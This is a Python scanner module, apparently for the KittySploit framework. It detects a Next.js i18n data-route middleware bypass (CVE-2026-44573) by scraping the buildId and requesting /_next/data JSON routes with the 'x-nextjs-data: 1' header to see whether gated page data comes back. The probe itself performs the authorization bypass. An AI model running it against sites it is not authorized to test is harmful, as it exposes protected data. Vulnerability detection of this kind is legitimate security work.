#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js i18n data-route middleware bypass (CVE-2026-44573) — detect",
        "description": (
            "Scrapes buildId from __NEXT_DATA__, then GETs `/_next/data/<buildId><page>.json` variants "
            "with `x-nextjs-data: 1`. Positive if HTTP 200 and `sentinel` appears in the JSON body."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-44573",
        "references": ["https://github.com/advisories/GHSA-36qx-fr4f-26g5"],
        "tags": ["scanner", "http", "nextjs", "i18n", "middleware"],
    }

    home_path = OptString("/", "Path to scrape for buildId (__NEXT_DATA__)", required=False)
    protected_path = OptString("/secret", "Gated page path → …/secret.json", required=False)
    default_locale = OptString("en", "Locale segment for second variant", required=False)
    build_id = OptString("", "Manual buildId (empty = scrape)", required=False, advanced=True)
    sentinel = OptString(
        "SECRET_PROPS_FLAG",
        "Substring that must appear in JSON when bypass succeeds",
        required=False,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _origin(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        return f"{proto}://{t}:{p}"

    def _full(self, rel):
        rel = (rel or "/").strip() or "/"
        if not rel.startswith("/"):
            rel = "/" + rel
        return self._origin() + rel

    def _get_path(self, rel, extra_headers=None):
        url = self._full(rel)
        kw = dict(allow_redirects=False, timeout=float(self._o(self.timeout)))
        if extra_headers:
            kw["headers"] = extra_headers
        try:
            r = self.get(url, **kw)
            loc = (r.headers.get("Location") or "").strip()
            ct = (r.headers.get("Content-Type") or "").strip()
            return r.status_code, loc, ct, r.content[:200_000], None
        except Exception as e:
            return 0, "", "", b"", str(e)
        finally:
            if extra_headers:
                for k in extra_headers:
                    self.session.headers.pop(k, None)

    def _resolve_build_id(self):
        manual = str(self._o(self.build_id) or "").strip()
        if manual:
            return manual, None
        home = str(self._o(self.home_path) or "/").strip() or "/"
        code, _, _, body, err = self._get_path(home)
        if err:
            return None, err
        if not code:
            return None, "empty response status"
        text = body.decode("utf-8", "replace")
        m = re.search(r'"buildId"\s*:\s*"([^"]+)"', text)
        return (m.group(1) if m else None), None

    def _probe_pair(self, bid, prot, loc):
        hdr = {"x-nextjs-data": "1"}
        a = f"/_next/data/{bid}{prot}.json"
        b = f"/_next/data/{bid}/{loc}{prot}.json"
        ra = self._get_path(a, hdr)
        rb = self._get_path(b, hdr)
        return a, ra, b, rb

    @staticmethod
    def _hit(code, body, needle):
        return code == 200 and bool(needle) and needle in body.decode("utf-8", "replace")

    def run(self):
        needle = str(self._o(self.sentinel) or "").strip()
        if not needle:
            self.set_info(reason="Option `sentinel` is empty")
            return False
        bid, err = self._resolve_build_id()
        if not bid:
            self.set_info(reason=f"No buildId ({err or 'not in __NEXT_DATA__'})")
            return False
        prot = str(self._o(self.protected_path) or "/secret").strip() or "/secret"
        if not prot.startswith("/"):
            prot = "/" + prot
        loc = str(self._o(self.default_locale) or "en").strip() or "en"

        _, _, _, _, be = self._get_path(prot)
        if be:
            self.set_info(reason=f"Baseline GET failed: {be}")
            return False

        a_rel, ra, b_rel, rb = self._probe_pair(bid, prot, loc)
        for rel, row in ((a_rel, ra), (b_rel, rb)):
            code, _, _, body, verr = row
            if verr:
                continue
            if self._hit(code, body, needle):
                self.set_info(reason=f"200 + sentinel on {rel}", build_id=bid, confidence="high")
                return True
        self.set_info(reason="No 200+sentinel on data routes", build_id=bid, confidence="medium")
        return False
